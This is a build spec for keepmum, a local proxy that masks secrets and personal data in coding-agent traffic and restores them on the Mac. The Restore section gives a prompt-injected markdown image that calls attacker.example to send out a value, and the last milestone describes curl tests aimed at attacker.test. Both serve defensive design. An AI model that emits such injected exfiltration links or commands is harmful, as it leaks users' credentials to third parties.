# keepmum — Local Secret & PII Redaction for Coding Agents (Build Spec)

Oct 25, 2026 · @Yujia Lin · updated Oct 29, 2026 for Codex, pi and opencode, pf-serve, the Mac app, and the rules without the model; Nov 3, 2026 for Gemini CLI, other gateways, the guards on restore, and the first alpha; Nov 10, 2026 for local mode's skills and hand-back, local mode for Gemini's API, and the Antigravity CLI

## Summary

keepmum is a local proxy that removes secrets and personal data from coding-agent requests (Claude Code, Codex, Gemini CLI, pi, opencode) before they leave the Mac, then restores the real values locally. Nothing is sent to any third party: detection runs fully on-device. The name comes from "keep mum": to say nothing about a secret.

Build order: **Phase 0 is a benchmark** that measures which detectors are fast and accurate enough. The real proxy is built only after those numbers are in.

**Instructions for Claude Code**

- Treat this doc as the spec. Work one phase at a time and stop for review at the end of each phase.
- Anything marked **VERIFY** is an assumption about an external API (Apple `fm`, the Apple Foundation Models Python SDK, OpenAI Privacy Filter). Check the real docs or `--help` output before writing code against it, and update this doc if it is wrong.
- Never write a real secret into code, tests, fixtures, logs or commit messages. Use synthetic test values only.
- Keep it simple. Prefer the standard library and a few well-known dependencies over frameworks.

## Goals, non-goals, constraints

The goal is a one-command tool: `keepmum claude` starts Claude Code with every request scrubbed, and the user notices nothing else.

**Goals**

1. No raw secret (API key, token, password, private key, connection string) reaches the model provider (api.anthropic.com, api.openai.com, chatgpt.com).
2. Personal data (names, emails, phones, addresses, account numbers) is redacted when enabled.
3. Claude can still edit files that contain secrets: placeholders are restored before tools run locally.
4. Fail closed: if keepmum is down or a detector errors, the request is blocked, never sent raw.
5. Added latency stays small enough to be unnoticeable. Phase 0 sets the actual budget.

**Non-goals (v1)**

- ~~Other AI clients (Codex, Cursor, Gemini CLI).~~ Codex and pi were added on Oct 27, 2026, opencode on Oct 29, Gemini CLI on Nov 1 (Milestones). Cursor remains out of scope.
- Linux, Windows, or Intel Macs.
- Compliance certification. keepmum is a safety layer, not an anonymization guarantee.
- Rewriting Claude Code's local transcript files.

**Hard constraints**

| Constraint | Value |
| --- | --- |
| OS | macOS 14 or later (the original floor, macOS 27, came from the Apple model, which was dropped) |
| Hardware | Apple silicon; reference machine is an M4 with 48 GB |
| Network | Detection fully offline; the only outbound connections are the forwarded request to the provider and `keepmum setup`'s one model download |
| Language | Python 3.12+, managed with `uv`; the model runs in pf-serve, a native program (C++ on ggml) |
| Distribution | Keepmum.app (self-contained, notarized DMG on GitHub Releases, updates itself with Sparkle from 0.1.0a2; first: 0.1.0a1, Nov 3, 2026) and `uv tool install`; a Homebrew cask later |
| Name | `keepmum` — check GitHub, PyPI and Homebrew before first publish; fall back to `keepmum-redact` if taken |

## Architecture

keepmum is a local HTTP proxy: each coding agent talks to it through its base-URL setting (Claude Code's `ANTHROPIC_BASE_URL`, a `keepmum` model provider in Codex, pi's `models.json`, opencode's `opencode.json`), and it is the only thing that talks to the providers. It routes by path: Anthropic at the root, the OpenAI API under `/openai/`, ChatGPT under `/chatgpt/`.

&#91;embedded content: keepmum architecture · request and response paths\]

Requests flow left to right through Redact; responses flow right to left through Restore. Detection and the vault never touch the network, and if the proxy is down, Claude Code's requests fail instead of going out raw.

## Detection layers

Detection runs in two layers, cheapest first, followed by deterministic refinement of the model's spans. No LLM runs in the request path. Each layer returns spans (`start`, `end`, `type`, `confidence`), never rewritten text, so a model can never silently change code.

| Layer | Catches | Engine | Expected cost |
| --- | --- | --- | --- |
| L1 Rules | API keys (52 provider formats), tokens, JWTs, private keys, connection strings, `password=` assignments, secrets in flags, config files and sentences, high-entropy strings; with `pii = true`, emails, phones, SSNs, dates of birth, cards and IBANs | 96 regex rules + Shannon entropy + checksums (Luhn, IBAN mod-97) | Under 10 ms at 4K tokens; always on |
| L2 PII model | Names, addresses, emails, phones, URLs, dates, account numbers, secrets in context | OpenAI Privacy Filter (open-weight, Apache 2.0, 1.5B total / 50M active params, token classifier), q8 GGUF on pf-serve | One forward pass: p95 ≈ 100–145 ms at 4K tokens |
| Refinement | Model spans that are log noise: UUIDs, hashes, request ids, timestamps, API paths, placeholders, reserved example values | Deterministic rules in `detect/pipeline.py` | Microseconds |

**Rules for each layer**

- **L1** ships a default rule file (`rules.toml`) and supports user rules plus an allowlist (exact strings and regexes). Known example keys from docs, such as AWS's `AKIAIOSFODNN7EXAMPLE`, are allowlisted by default.
- **L1 personal-data rules** (`type` other than SECRET) run only with `pii = true`, and their spans pass `Pipeline.keep_pii` like the model's. A rule can require `min_classes` (how many of lowercase, uppercase, digits and other characters the value uses) and the `prose` filters (which also drop identifiers), for rules keyed on a word in a sentence.
- **L2** can be turned off: `detect.model = false` (`keepmum model off`) runs L1 alone, with no model download and no pf-serve process. A running proxy applies the change on its next request: pf-serve starts or stops on a background thread, and the swap waits for the scan in progress. If the model does not load, L1 keeps scanning and the stats feed reports why (`model_error`).
- **L2** is off for PII by default and on for secrets-in-context. Users enable PII with `pii = true`. Load the model once at startup and keep it warm. **VERIFIED (Oct 25, 2026):** the model id is `openai/privacy-filter`. It has 8 labels (`account_number`, `private_address`, `private_date`, `private_email`, `private_person`, `private_phone`, `private_url`, `secret`), tagged BIOES (33 classes) and decoded with constrained Viterbi; the default operating point has all six transition biases at 0. MLX ports exist (`mlx-community/openai-privacy-filter-bf16`, `-8bit`, others) and run through `mlx-embeddings`. That support is on its GitHub `main` only (PyPI 0.1.0 lacks it), so keepmum pins a commit and also needs `mlx-lm`. Transformers on MPS works but is about 10× slower; MLX is the backend. The model tags UUIDs, hashes and neighboring `key=value` log fields as `secret`, so keepmum refines its secret spans (see `detect/pipeline.py`). With `pii = true` it also refines personal-data spans (`Pipeline.keep_pii`): IDs tagged as accounts, timestamps tagged as dates, API paths tagged as URLs, reserved example emails and phones, and lowercase identifiers tagged as names are dropped. That raised PII precision from 0.55–0.61 to 0.90–0.93 with no recall loss.
- **Runtime: pf-serve (Oct 25, 2026).** The model runs in pf-serve (`native/pf-serve`, from magpie, MIT), built on privacy-filter.cpp (MIT) and ggml: a 2.4 MB binary using Metal on macOS, and Vulkan or the CPU on Windows and Linux. It replaces MLX so keepmum needs no Python ML packages and can be packaged for other systems. The weights are `LocalAI-io/privacy-filter-GGUF` `privacy-filter-q8.gguf` at revision `935d868`, SHA-256 `80efc180…998c`, downloaded by `keepmum setup`. Measured against MLX on all three datasets (`bench/results/PFSERVE.md`): the same secret recall and the same flagged negatives, 1.7 GB instead of 2.2–2.5 GB, and 0.7 s to load instead of 3–6 s. One IBAN was missed with `pii = true`; IBANs are now an L1 checksum rule. pf-serve runs as a child process: a request that errors or exceeds 30 s + 1 s per 4 KB is blocked, and the next request starts a new process. MLX stays in the benchmark (`bench/pf_mlx.py`, `uv sync --group mlx`).
- **No LLM judge in v1 (Oct 25, 2026).** Phase 0 tested two judges on 400 labeled spans. The Apple on-device model could not clear false positives without clearing real values. Qwen3-4B on MLX cleared some at first, but once personal-data refinement existed it cleared 0 of 347 spans while adding 2.2 GB and 1–1.5 s per turn. Both experiments are kept in `bench/judge.py` and `bench/results/MODELS.md`.
- **Apple on-device model: dropped from v1 (Oct 25, 2026).** Phase 0 measured it as a span extractor and as a judge (`bench/results/MODELS.md`). As an extractor it had p95 27 s at 4K tokens and flagged 62% of hard negatives. As a judge, no prompting setup cleared false positives without also clearing real values: zero-shot cleared 3% of false positives and leaked 4 of 100 real secrets, and content-tagging mode leaked 69. Custom adapters could change this, but they are Swift-only and need Apple's entitlement. `bench/afm.py` stays for the benchmark. API notes from the VERIFY pass: `fm respond --no-stream -g -i <instructions> --schema <file> [--guardrails permissive-content-transformations]`; the SDK is PyPI `apple-fm-sdk` (`apple_fm_sdk`), with `SystemLanguageModel(...).context_size` (8192) and `LanguageModelSession(instructions=, model=).respond(prompt, json_schema=, options=)`.

**Merge policy**

Union all spans, merge overlaps, keep the widest span and the highest-priority type (secret > PII). When in doubt, redact: a false positive costs a placeholder; a false negative leaks.

## Placeholders, vault, restore

Every sensitive value becomes a deterministic placeholder, so the same secret always maps to the same text. This keeps Anthropic's prompt cache valid across turns and makes re-redacting history consistent.

**Placeholder format**

- `KEEPMUM_<TYPE>_<id>`, for example `KEEPMUM_SECRET_7f3a9c2e` or `KEEPMUM_EMAIL_01b44d90`. It looks like an identifier, so Claude copies it verbatim instead of "fixing" it.
- `<id>` = first 8 hex chars of HMAC-SHA256(install salt, type + value). On a collision, extend to 12 chars.
- Types: `SECRET`, `PERSON`, `EMAIL`, `PHONE`, `ADDRESS`, `ACCOUNT`, `URL`, `DATE`.
- The install salt is generated once and stored in `~/.config/keepmum/salt` (mode 0600). It was kept in the macOS Keychain until Oct 26, 2026, but a Keychain item is readable without a prompt only by the program that created it, so the app, the CLI and the VS Code wrapper ended up with different salts, and a placeholder made by one could not be restored by another.

**Vault**

- In-memory map `placeholder → value` inside the proxy process. No persistence in v1: because responses are restored before Claude Code saves them, the local transcript holds real values, and they re-redact to the same placeholders on the next request.
- The vault is never logged, never written to disk, and cleared on exit.

**What gets scanned (request side)**

- Endpoints: `POST /v1/messages` and `POST /v1/messages/count_tokens` are scanned. Any other request that carries a body is **blocked** (403, API-style error), because forwarding it would send content out unscanned. Bodyless `GET`/`HEAD`/`OPTIONS` requests are forwarded and logged by path only. Review the paths Claude Code actually calls during M4.
- Fields: `system` (string or text blocks); `messages[].content` as a string or blocks: `text`, every string inside `tool_use.input` (recursively), and `tool_result.content` (string or blocks). Images and documents pass through in v1 (listed as a risk).
- Skip the `tools` array (Claude Code's own tool definitions) for speed.
- Never touch protocol fields the API checks: block ids (`toolu_…`), tool names, `tool_use_id`, the keys of `tool_use.input` (only its string values are scanned), `thinking` and `redacted_thinking` blocks, and anything with a `signature`. Changing a signed thinking block gets a 400 "Invalid signature". Thinking blocks are model output produced from already-redacted input, so they hold placeholders, not values, and are never restored either (see Restore).
- Known values: once a value is masked, every later exact occurrence of it is masked too, even where the detectors would miss it in a different context. The vault drives this by exact match, longest value first.
- Cache scan results per text block by SHA-256 in an LRU. Claude Code resends the whole history every turn, so only new blocks should hit the detectors.
- Auth headers (`x-api-key`, `authorization`) are forwarded unchanged so both API-key and subscription logins work. They are never logged.

**Restore (response side)**

| Where the placeholder appears | v1 default |
| --- | --- |
| Assistant text | Restore, except inside an http(s) address (Nov 2, 2026) |
| `thinking` blocks | Keep placeholder (signed; must be resent unchanged) |
| `tool_use` input for Edit, Write, MultiEdit, NotebookEdit | Restore |
| `tool_use` input for Bash and every agent's shell | Restore, except a token whose issuer is known going to another host (Nov 3, 2026) |
| `tool_use` input for WebFetch, WebSearch | Keep placeholder |
| `tool_use` input for every MCP tool (`mcp__*`) | "own": a value restored only if that server's own results held it (each value notes the servers whose tool results it was masked in, in memory only). A list of types adds values of those types from anywhere |

The policy lives in config (`[restore]` per tool name; the longest matching prefix decides), so it can be tightened without code changes. For any tool not set to "restore", three rules hold whatever the setting: a SECRET is never restored; more than 5 values in one call means none are; and while a server's tool definitions (name, description, input schema, hashed) differ from the ones first seen or last trusted (`keepmum tools trust`), it gets placeholders only. A tool first seen later is trusted as it appears, since Claude Code loads deferred tools one at a time. The servers seen, those hashes, and per day the calls that kept a type a setting could let through are in `~/.config/keepmum/tools.json` (0600), shared by every keepmum process under a file lock.

Assistant text is shown, and a client that renders it fetches what it points at: an image loads by itself, a link on a click, a link preview in the background. So a placeholder inside a web address in the text stays a placeholder, or a prompt-injected `![](https://attacker.example/?k=KEEPMUM_…)` would send the real value there. The run of text since the last whitespace decides: it is an address when it holds `http://`, `https://` or a protocol-relative `//host` after `(`, `[`, `<`, a quote or `=`. Streams carry that run from one delta to the next, so an address split across deltas is still one. Other schemes are restored (`postgres://user:…@host`): no renderer fetches them. The audit entry counts the kept ones per type (`in_urls`), never the values.

**Streaming (the tricky part)**

Claude Code uses server-sent events. Placeholders can be split across deltas, so restore needs buffering.

1. `content_block_delta` with `text_delta`: keep a tail buffer. If the end of the buffered text could be the start of a placeholder (matches a prefix of `KEEPMUM_`), hold it until the next delta or `content_block_stop`; otherwise flush.
2. `content_block_delta` with `input_json_delta`: buffer the whole tool input until `content_block_stop`, restore, then emit it as one delta. Tool inputs are not shown progressively, so the delay is invisible.
3. When restoring inside JSON (`partial_json`), JSON-escape the real value. Secrets often contain quotes or backslashes.
4. Non-streaming responses: parse the JSON, restore, re-serialize.
5. Pass all other events (`message_start`, `message_delta`, `ping`, `error`) through untouched and in order.

## Phase 0: benchmark first

Phase 0 answers one question: which detector combination catches enough secrets, fast enough, to sit in front of every request? No proxy code is written until this phase is reviewed.

**Labeled dataset** (`bench/data/*.jsonl`)

Each record: `{"id", "text", "spans": [{"start", "end", "type"}], "tags": [...]}`. Target about 150 records to start:

| Group | Records | Examples |
| --- | --- | --- |
| Secrets | 50 | AWS, GitHub, Anthropic, OpenAI, Stripe, Slack keys; JWTs; PEM private keys; `.env` files; Postgres/Redis URLs with passwords |
| PII | 40 | Names, emails, phones, addresses inside code comments, logs, JSON fixtures, commit messages |
| Hard negatives | 40 | UUIDs, git SHAs, base64 test data, hashes in lockfiles, docs example keys, `user@example.com`, Kubernetes ports |
| Long, realistic | 20 | Claude-Code-like payloads: a source file or log of 1K, 4K and 8K tokens with 0–3 secrets buried inside |

- Generate secrets with a script (`bench/gen.py`) that produces random values in each provider's format. Never use or paste real keys.
- Use Faker for PII. Hand-write the hard negatives; they matter as much as the positives.

**Detectors under test**

1. `rules` — L1 only.
2. `pf` — OpenAI Privacy Filter only.
3. `afm-cli` — Apple on-device model via `fm respond` subprocess, asked to return spans as JSON.
4. `afm-sdk` — same prompt via the Python SDK (measures subprocess overhead vs. in-process).
5. `rules+pf` and `rules+pf+afm` — the layered pipeline, with AFM judging only ambiguous spans.

**Metrics** (per detector, per type, per input size)

- Span precision, recall, F1. A detected span counts as a hit if it overlaps a labeled span by at least 50%.
- Latency p50 and p95 per input at 1K, 4K and 8K tokens; cold start; tokens per second.
- Peak memory (RSS).
- AFM only: refusals, schema failures, and context-overflow errors, as counts.

**Command**

`keepmum bench --detectors rules,pf,afm-cli,afm-sdk --data bench/data --out bench/results/` writes a JSON file and a Markdown summary table. (Since Oct 26, 2026 this is `uv run python bench/run.py`; the benchmark and its candidate detectors live in `bench/`, outside the package.)

**Decision rules (starting targets; adjust after the first run)**

- Secrets recall must be at least 0.98 for the default pipeline. Leaks are worse than noise.
- Hard-negative false positives below 5%.
- Added p95 latency per turn at or below 150 ms when new content is 4K tokens or less.
- Keep AFM in the default pipeline only if it measurably improves precision on ambiguous spans within that budget. Otherwise ship it as an opt-in flag.
- **Outcome (Oct 25, 2026):** the pipeline is `rules + pf` (8-bit MLX at the time; pf-serve since, same results) with secret and personal-data refinement, and `pii = false` by default. No LLM judge: the Apple model and Qwen3-4B were both measured and dropped. See `bench/results/PHASE0.md` and `MODELS.md`.

## CLI, config, layout, milestones

The user experience is one command, `keepmum claude` or `keepmum codex`, or the Mac app with protection switched on. Everything else exists for setup, settings, debugging and CI.

**Commands**

| Command | What it does |
| --- | --- |
| `keepmum claude [args]` | Starts the proxy on a free local port, runs `claude` with `ANTHROPIC_BASE_URL` pointing at it, stops the proxy when Claude exits. Passes all args through. |
| `keepmum codex [args]` | The same for Codex, with `-c` overrides for that run (a `keepmum` provider, WebSockets off). |
| `keepmum gemini [args]` | The same for Gemini CLI, through `GOOGLE_GEMINI_BASE_URL` and `CODE_ASSIST_ENDPOINT` for that run. |
| `keepmum serve` | Runs the proxy standalone on `127.0.0.1:7788` (configurable). Binds to localhost only. |
| `keepmum protect on\|off\|status [--client]` | Points Claude Code, Codex, pi and opencode at `keepmum serve` in their own config files, or undoes it. |
| `keepmum observe on\|off` | Observe only: scan and count, but forward requests unchanged. |
| `keepmum model on\|off` | The rules and the local model, or the rules alone. |
| `keepmum pii on\|off` | Mask personal data too, or only secrets and your own rules (the default). |
| `keepmum types` / `keepmum rules` | What gets masked: types passed through, your own mask rules, exceptions, built-in rules turned off. |
| `keepmum tools [allow\|set\|trust]` | MCP servers and web tools seen, and which real values each may receive. |
| `keepmum guard [setup\|injection\|harm\|commands\|local\|remove]` | The optional checks: prompt injection in tool results, harmful requests in what you type, risky shell commands in replies; off, warn, block, or local (a flagged request answered by a model on this Mac). |
| `keepmum destinations [add\|remove]` | Hosts a shell command may send a rule's tokens to, besides its issuer's own. Adding needs `--yes`. |
| `keepmum extensions [keep\|remove]` | Plugins, marketplaces, hooks, MCP servers, skills and global instruction files in the agents' settings; what other apps added since you last looked, kept or taken out (one entry, after a backup). |
| `keepmum log previews\|context on\|off` | What the app's Logs page may show about masked values (memory only). |
| `keepmum exclude` / `keepmum include` | Lets one project's Claude Code skip keepmum. |
| `keepmum status` | Setup, protection and settings as JSON, for the Mac app. |
| `keepmum audit list\|verify\|head\|export\|keep` | The tamper-evident audit log: requests, protection changes, starts and stops. |
| `keepmum scan <file or ->` | Prints findings with values masked; exits 1 if anything is found. Usable as a pre-commit hook. |
| `keepmum setup` | Downloads the Privacy Filter model once and checks its pinned SHA-256. |
| `keepmum doctor [--json]` | Checks macOS version, Apple silicon, pf-serve and the model (with a canary), the install salt, protection, routes around the proxy, what was added to the agents' settings since you last looked, port free. |
| `keepmum selftest` | Sends a synthetic canary secret through the proxy to a local mock upstream and fails unless it arrives redacted. |

**Config** (`~/.config/keepmum/config.toml`, all optional; unknown keys and bad values are errors)

```toml
[server]
port = 7788                          # for `keepmum serve`; `keepmum claude` picks a free port
upstream = "https://api.anthropic.com"

[detect]
pii = false                          # also mask personal data (L1 secret rules are always on)
model = true                         # L2 after L1; false: L1 alone
observe = false                      # count only; requests go out unmasked
pass = []                            # types never masked, e.g. ["PERSON"]

[rules]                              # the user's own patterns, always masked
mask = []                            # [{ name, pattern, type }]
off = []                             # built-in rule names turned off (`keepmum rules builtin`)

[allowlist]                          # added to the built-in allowlist, never replacing it
strings = []
patterns = []

[restore]                            # per tool: "restore", "keep", "own" or a list of types (never SECRET);
default = "restore"                  #   prefixes like "mcp__files__*" allowed, the longest match decides
WebFetch = "keep"
WebSearch = "keep"
"mcp__*" = "own"

[destinations]                       # hosts a shell command may also send a rule's tokens to
gitlab-token = ["gitlab.corp.example"]

[gateways]                           # gateways behind keepmum, each at /gateway/<name> (`keepmum protect on` adds them)
local-3425 = "http://127.0.0.1:3425"

[log]
level = "info"                       # never logs values, only type + counts

[audit]
keep_days = 90                       # audit log retention; shortening it is recorded as weakening

[guard]                              # the optional checks, all "off" by default
injection = "off"                    # tool results: "warn", "block" or "local"
harm = "off"                         # what the user typed: "warn", "block" or "local"
harm_model = "small"                 # or "0.6b", "4b"
commands = "off"                     # shell commands in replies: "warn" or "block"
local_servers = []                   # [{ url, model, checks?, api? }] on this Mac, tried in order
```

`keepmum claude` writes logs to `~/.config/keepmum/keepmum.log` (mode 0600), because the terminal belongs to Claude Code, and records its port in `~/.config/keepmum/runtime.json` (0600) for the Mac app. It refuses to start if any Claude Code settings file sets `ANTHROPIC_BASE_URL` or a Bedrock/Vertex/Foundry switch, or if such a switch is in the environment, since that could route traffic around the proxy. An `ANTHROPIC_BASE_URL` already in the environment (another gateway) becomes keepmum's upstream.

**Other gateways (Nov 2, 2026).** keepmum goes in front of a gateway an agent already uses (agent → keepmum → gateway → provider), so it can be used alongside model gateways rather than replacing them. Each gateway is a named route, config `[gateways]` (`name = URL`), served at `/gateway/<name>/<path>`: the path is forwarded as it came, and the API to scan is read from its end (`…/v1/messages`, `…/responses`, Gemini's `…/models/<m>:<method>`); anything else with a body is refused, and an unknown name is a 404, never forwarded. `protect on` points each agent that was set up for a gateway at that gateway's route, with the same path after it, and writes a new gateway to the config first (audited by `keepmum protect on`, flagged as a new destination). Routes are per agent, not per API: one gateway per API would send other agents' direct traffic, and their keys, to it. `off` maps the route back to the URL; Codex's provider block is copied with only the base URL changed, and the provider it replaced is noted on keepmum's `model_provider` line. A gateway's app that writes its address back is reported as `around` by `protect status`, `keepmum doctor` and the Mac app. Gateway URLs must use https unless they are on this Mac, and never point at keepmum itself. Verified end to end with `keepmum serve` and a stand-in gateway: Messages and Responses requests through the route arrived with placeholders only and the gateway's own key, replies came back restored, Chat Completions and an unknown route were refused, a rewritten Claude Code setting was reported and re-adopted, and `off` restored both agents' files exactly.

**Stack**

Python 3.12, `uv`, Typer (CLI), Starlette + uvicorn (proxy server), httpx (async streaming upstream), pytest. L2 needs no Python packages: pf-serve is a separate binary (`native/pf-serve/build.sh`) and `keepmum setup` downloads its model. The benchmark's candidate detectors and their dependency groups (`mlx`, `torch`, `afm`) live in `bench/`, outside the package.

**Repo layout**

```
keepmum/
  pyproject.toml
  src/keepmum/
    cli.py          # Typer entry point
    proxy.py        # Starlette app: routing by provider, rewrite, SSE, fail-closed
    redact.py       # walk Messages and Responses API payloads, apply spans, placeholders
    restore.py      # vault lookup, Messages API streaming restore
    responses.py    # Responses API restore, whole and streamed
    vault.py        # in-memory map, HMAC ids, install salt
    stats.py        # counts-only stats feed, history file, flow totals
    audit.py        # tamper-evident audit log: hash chain, settings diffs, verify
    protect.py      # Claude Code settings, project exclusions
    clients.py      # Codex, pi and opencode configs, `keepmum codex`
    gemini.py       # Gemini API and Code Assist restore, whole and streamed
    gateway.py      # gateways behind keepmum, routes per gateway
    tools.py        # what each network tool may receive, servers seen, tool hashes
    destinations.py # where a token with a known issuer may go in a shell command
    guard.py        # the prompt-injection check
    harm.py         # the harm check (and qwen3guard_prompt.py)
    commands.py     # the risky-commands check on replies
    local.py        # local mode: a flagged request answered on this Mac
    handback.py     # local mode: handing the conversation back to the cloud after an injection hit, or a harm hit rewritten
    llamacpp.py     # llama-server, the checks' runtime
    launch.py       # `keepmum claude`, the VS Code wrapper, background server
    detect/
      rules.py      # L1 regex + entropy + checksums, user rules
      rules.toml    # default rule set
      pfserve.py    # L2 OpenAI Privacy Filter through pf-serve
      merge.py      # span union and priority
      pipeline.py   # layers, refinement of model spans, types passed through
    config.py
  native/pf-serve/  # pinned build of the model runtime
  mac/              # the SwiftUI app, bundling and release scripts
  bench/            # run.py, gen.py, candidate detectors, data/, results/
  site/             # keepmum.app: one static page, published by .github/workflows/site.yml
  tests/
```

**Milestones** (stop for review after each)

- [x] **M0 Benchmark.** Dataset, `keepmum bench`, first results table. Done when the default pipeline is chosen from real numbers. *Done Oct 25, 2026: `rules + pf-8bit` with refinement and no LLM (`bench/results/PHASE0.md`).*
- [x] **M1 Scanner.** `detect/` + `redact.py` + `keepmum scan`. Done when every dataset record round-trips: redact, then restore, gives the original text byte-for-byte.
- [x] **M2 Proxy, non-streaming.** `/v1/messages` and `count_tokens` rewrite, fail-closed errors, `keepmum selftest`, and the local stats feed the Mac app reads (counts, types and timestamps only, never values). Done when the canary never reaches the mock upstream.
- [x] **M3 Streaming restore.** SSE tail buffer and tool-input buffering. Done when placeholders split at every possible byte offset are restored correctly (property test).
- [x] **M4 `keepmum claude`.** Wrapper, config file, restore policy, `keepmum doctor`. Done when a real Claude Code session edits a file containing a fake secret and the file ends up with the real value. *Passed Oct 25, 2026 (Claude Code 2.1.273): the file ended with the real value, and a recording relay between keepmum and Anthropic saw 0 copies of either fake secret. Claude Code only called `HEAD /api/hello` and `POST /v1/messages`.*
- [ ] **M4.5 Secret classifier — on hold (Oct 25, 2026).** A small encoder that labels candidate spans as credential, identifier, placeholder or personal data, replacing hand-written refinement as the main filter for false positives. The trigger is fresh held-out set 2: 9 of 15 hard negatives were flagged, each a new identifier shape. Candidate data: Samsung CredData (Apache-2.0) plus synthetic positives and harvested public identifiers. Never train on the hand-written negative sets.
- [x] **M5 Mac app.** *Done Oct 27, 2026: a menu-bar app and dashboard that bundles the engine, runs it as a LaunchAgent and sets itself up; flow diagrams per agent and provider, Detection with per-type switches and user rules, a persistent request history, observe mode. Signing and the Homebrew cask moved to M6.* Original plan: a SwiftUI menu-bar app with a dashboard window and Swift Charts. It shows a live flow diagram (Claude Code → keepmum → Anthropic) with counts, redactions over time by type, restores, fail-closed blocks, detection latency and model health, plus start/stop and a PII toggle. It reads M2's stats feed over a local socket guarded by a 0600 token file. It never receives a sensitive value, sends no telemetry and checks for no updates. Signed with Developer ID and notarized; ships as a Homebrew cask.
- [x] **Codex and pi (Oct 27, 2026).** The proxy routes by path prefix: Anthropic at the root, the OpenAI API under `/openai/`, ChatGPT (Codex's subscription backend) under `/chatgpt/`. The Responses API is scanned like the Messages API: `instructions`, message text, `function_call` arguments (values, not keys) and tool outputs; reasoning items pass through. Replies are restored whole and as streams (`response.output_text.delta` tail buffer, tool-call arguments held until `.done`). zstd and gzip request bodies are decoded; other encodings and WebSocket upgrades are refused. Verified with Codex 0.147 against chatgpt.com: the request carried placeholders only and the shell command ran with the real value. `keepmum codex` for one run, `keepmum protect` for Codex's config.toml and pi's models.json; clients are named by an `x-keepmum-client` header the proxy strips.
- [x] **Gemini CLI (Nov 1, 2026).** `keepmum gemini` runs Gemini CLI with `GOOGLE_GEMINI_BASE_URL`, `CODE_ASSIST_ENDPOINT` and `GOOGLE_VERTEX_BASE_URL` set to keepmum's `/gemini`, `/codeassist` and `/vertex`; a .env value applies only to a variable not already set, so these win over every .env file (Gemini CLI 0.66, `loadEnvironment`). The Gemini API's generateContent, streamGenerateContent, countTokens and embedding methods, and Code Assist's generateContent, streamGenerateContent and countTokens, are scanned: every `contents` part (text, function call arguments, function responses, code), the system instruction, and Code Assist's `request` wrapper. Thought parts are signed model output and pass through both ways; images and files pass through. The placeholder hint goes last in the system instruction of generate calls only (countTokens takes none). Replies are restored whole, as SSE streams (a tail buffer per candidate; function calls arrive whole) and as JSON-array streams. Code Assist's setup and metrics calls (loadCodeAssist, onboardUser, listExperiments, retrieveUserQuota, fetchAdminControls, setCodeAssistGlobalUserSetting, recordCodeAssistMetrics) were read in Gemini CLI 0.66: project ids, client metadata, counts and statuses, no conversation text; they pass through, and any other Code Assist method is blocked. `/vertex` refuses everything. No `keepmum protect`: `findEnvFile` returns the first .env walking up from the project, so a project's .env would silently override a setting in `~/.gemini/.env`. Tested against a local stand-in for both APIs (selftest, `tests/test_gemini.py`, and `keepmum gemini` with a stand-in binary on real sockets); not yet run with Gemini CLI itself.
- [x] **opencode (Oct 29, 2026).** `keepmum protect` sets `provider.anthropic` and `provider.openai` `options.baseURL` in `~/.config/opencode/opencode.json` (the 1.x shape, which 2.x migrates). opencode keeps one OpenAI base URL for both logins, so an `/openai/v1` request that carries `chatgpt-account-id` is routed to chatgpt.com; scanned bodies sent there are zstd-compressed, since that backend refuses large uncompressed ones. An upgrade request that arrives as plain HTTP (uvicorn without a WebSocket library) is refused, not forwarded. Verified with opencode 2.2.1 (`opencode run`) against a local stand-in for both providers: 8 requests, including session titles, carried placeholders only, the replies showed the real value, and the WebSocket attempt fell back to HTTPS. A plugin was ruled out: plugin load errors are swallowed and `--pure` skips plugins, so protection would vanish silently, and no hook sees model output before it becomes a tool call. opencode 1.x with a ChatGPT login is not covered and is reported.
- [x] **More rules, and the rules without the model (Oct 29, 2026).** 69 more L1 rules (96): 52 provider formats from gitleaks and TruffleHog, 11 for secrets in flags, config files and sentences, and 6 for personal data (emails, phones, SSNs, dates of birth). `detect.model = false` runs L1 alone and switches while running. Measured on dev and a new held-out set written before the rules (`bench/results/RULES.md`): with the rules alone, secret recall went from 0.78 to 0.99 and personal-data recall from 0.39 to 0.77, at precision 0.996, with no hard negative flagged; the earlier held-out sets flag exactly what they flagged before.
- [x] **Built-in rules turned off (Oct 29, 2026).** `[rules] off` (`keepmum rules off|on`, the Detection page's Top rules) turns off a rule or check by name; rules that find secrets need `--yes` or a confirmation. The vault records which detectors found each value, so the known-values pass lets a value masked earlier go once every detector that found it is off or was your own rule and is gone, or the value has an exception. Before this, an exception added mid-session did not unmask a value already masked.
- [x] **Logs page (Oct 29, 2026).** `GET /_keepmum/findings` (stats token) lists the values masked in new text, newest first: type, detector and rule, length, agent, outcome, and the first and last character of values of 8 or more characters. Kept in memory (the last 2,000), never in `history.jsonl`; `[log] previews = false` drops the characters, including those already kept. The Mac app's Logs page searches and filters it. This relaxes the earlier rule that the feed carries no part of a value, at the user's request; values under 8 characters still show none.
- [x] **Logs context (Nov 1, 2026).** Each finding also carries up to 80 characters of the text before and after the value, with every masked value and placeholder in that window, whole or cut by it, shown as its type (`‹SECRET›`): in mask mode, what the provider received. Memory only, with the findings; `[log] context = false` drops it, including what was kept, and is recorded in the audit log. The Mac app shows it in a row's details, and draws each value as its first and last character around one star per hidden character. Findings also list every detector that found the value (`by`: `yours:<name>`, `rule:<id>`, `model`), not only the one credited, and mark a value matched again from earlier in the conversation (`earlier`) with the detectors that first found it, from the vault.
- [x] **Audit log (Oct 30, 2026).** The first of three privacy and security features that set keepmum apart from general gateways (then an exposure scan of local transcripts, then an egress guard for shell commands, whose first layer shipped on Nov 3, 2026: see Shell destinations). See *Audit log* below. Verified end to end with `keepmum serve` against a local stand-in provider: start, the request with its restore decision, an `observe on` marked as weakening, and the stop on SIGTERM, in a chain that verifies, with no value or placeholder in the file.
- [x] **Other gateways (Nov 2, 2026).** `keepmum protect on` goes in front of a gateway an agent already uses, through a route per gateway; see *Other gateways* above. Verified with Claude Code, Codex, pi and opencode against a stand-in gateway: placeholders only at the gateway, its own key, and `off` restoring every config file byte for byte.
- [x] **Web addresses in replies (Nov 2, 2026).** A placeholder inside an http(s) address in reply text stays a placeholder, so a rendered image or link cannot carry a value out; see Restore. Verified with Claude Code: the text got the real value, the image address the placeholder.
- [x] **Shell destinations (Nov 3, 2026).** A token whose issuer is known stays a placeholder in a shell command that names another host (`destinations.py`, Open questions). Verified with Claude Code running two curl commands: attacker.test received the placeholder, api.github.com the token. Cases: `docs/test-cases/shell-destinations.md`.
